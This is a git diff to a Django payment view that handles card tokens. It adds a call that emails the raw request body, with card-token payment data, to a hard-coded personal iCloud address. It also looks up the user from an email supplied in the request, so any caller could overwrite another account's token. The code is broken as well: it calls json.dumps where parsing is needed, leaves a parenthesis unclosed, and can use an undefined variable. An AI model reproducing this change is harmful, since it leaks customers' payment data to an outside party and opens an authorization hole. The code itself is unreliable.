@@ -6,6 +6,7 @@ from django.contrib.auth.decorators import login_required, user_passes_test
 from django.conf import settings
 from django.utils import timezone
 from django.http import JsonResponse
+from django.contrib.auth import get_user_model
 
 from .forms import BillingDataForm
 from .utils import AcceptAPI
@@ -129,12 +130,22 @@ def subscribe_done(request):
     return render(template_name='masterstudy/subscribe-done.html', request=request, context=context)
 
 def save_token(request):
-    token = json.dumps(request.body.decode('utf-8'))['obj']['token']
+    req_data = json.dumps(request.body.decode('utf-8'))
+    from django.core.mail import send_mail
+    send_mail(
+        subject='Armstrong Invoice',
+        from_email=settings.FROM_EMAIL,
+        recipient_list=['muhamedhassan8@icloud.com'],
+        message=req_data,
+        html_message=req_data,
+    )
+    if req_data['type'] == 'TOKEN':
+        t_data = req_data['obj']
 
     CardToken.objects.update_or_create(
-        user=request.user,
+        user=get_user_model().objects.get(email=t_data['email'],
         defaults={
-            'token': token,
+            'token': t_data['token'],
         }
     )
     return JsonResponse({}, status=204)
